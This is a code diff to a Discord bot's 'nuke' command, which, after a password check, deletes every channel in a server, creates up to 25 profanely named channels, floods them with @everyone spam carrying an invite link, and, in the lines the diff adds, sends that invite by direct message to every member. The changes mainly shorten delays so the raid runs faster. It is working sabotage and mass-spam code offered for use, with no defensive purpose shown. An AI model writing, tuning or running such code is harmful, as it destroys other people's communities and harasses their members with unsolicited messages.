@@ -153,7 +153,7 @@ client.on('interactionCreate', async interaction => {
       }
     }
 
-    // ==================== NUKE - FIXED (No followUp after deletion) ====================
+    // ==================== NUKE - FASTER + DM INVITE ====================
     if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
       const password = interaction.fields.getTextInputValue('password');
       if (password !== NUKE_PASSWORD) {
@@ -169,17 +169,20 @@ client.on('interactionCreate', async interaction => {
       await interaction.editReply({ content: `☢️ Starting nuke on **${guild.name}**...` });
 
       const delay = ms => new Promise(r => setTimeout(r, ms));
+      const invite = 'https://discord.gg/NANQMy3WnD';
 
       try {
         // Delete all channels
         for (const channel of guild.channels.cache.values()) {
           await channel.delete().catch(() => {});
-          await delay(400);
+          await delay(350);
         }
 
-        // Create channels
+        // Create channels (faster)
+        await interaction.editReply({ content: '🔨 Creating fucked-by-fame channels (faster)...' });
         const created = [];
-        for (let i = 0; i < 20; i++) {
+
+        for (let i = 0; i < 25; i++) {
           try {
             const chan = await guild.channels.create({
               name: 'fucked-by-fame',
@@ -187,24 +190,39 @@ client.on('interactionCreate', async interaction => {
               reason: 'Nuke by Fame'
             });
             created.push(chan);
-            await delay(1300);
+            await delay(650); // Faster than before
           } catch (e) { break; }
         }
 
-        // Spam
-        const invite = 'https://discord.gg/NANQMy3WnD';
+        // Spam in channels
+        await interaction.editReply({ content: `💥 Spamming in ${created.length} channels...` });
         const spam = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;
 
         for (const channel of created) {
           for (let i = 0; i < 10; i++) {
             channel.send(spam).catch(() => {});
-            if (i % 3 === 0) await delay(500);
+            if (i % 3 === 0) await delay(400);
           }
         }
 
-        // Final message using editReply (safest)
+        // DM Members with invite
+        await interaction.editReply({ content: '📨 Sending invite to members via DM...' });
+        let dmCount = 0;
+        const members = await guild.members.fetch();
+
+        for (const member of members.values()) {
+          if (!member.user.bot && member.id !== interaction.user.id) {
+            try {
+              await member.send(`**fucked by veynetta**\n${invite}\n**FAME REAL FAME**`).catch(() => {});
+              dmCount++;
+              await delay(700); // DM rate limit safety
+            } catch {}
+          }
+        }
+
+        // Final message
         await interaction.editReply({ 
-          content: `✅ **NUKE COMPLETE**\nCreated **${created.length}** channels named \`fucked-by-fame\`\nSpamming @everyone + invite link` 
+          content: `✅ **NUKE COMPLETE**\n• Created **${created.length}** \`fucked-by-fame\` channels\n• Spammed @everyone + invite\n• Sent invite to **${dmCount}** members` 
         });
 
       } catch (err) {
